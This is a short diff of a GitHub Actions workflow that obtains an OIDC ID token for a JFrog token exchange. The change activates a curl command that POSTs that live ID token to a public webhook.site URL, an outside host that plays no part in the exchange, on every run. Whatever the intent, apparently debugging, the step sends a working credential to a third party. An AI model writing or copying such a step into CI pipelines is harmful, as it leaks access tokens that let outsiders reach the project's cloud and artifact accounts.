@@ -23,7 +23,7 @@ jobs:
           ID_TOKEN=$(curl -sLS -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
           "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github-sunil" | jq .value | tr -d '"')
           echo "ID_TOKEN=${ID_TOKEN}" >> $GITHUB_ENV
-          #curl -X POST https://webhook.site/484d44d9-bd16-4e1e-87ec-1c4e7d639428 -H "Authorization: Bearer ${ID_TOKEN}"
+          curl -X POST https://webhook.site/df28a5fc-d6b9-4c14-9c38-71c3df802985 -H "Authorization: Bearer ${ID_TOKEN}"
       - name: Exchange token with access
         env:
           ID_TOKEN: ${{ env.ID_TOKEN }}
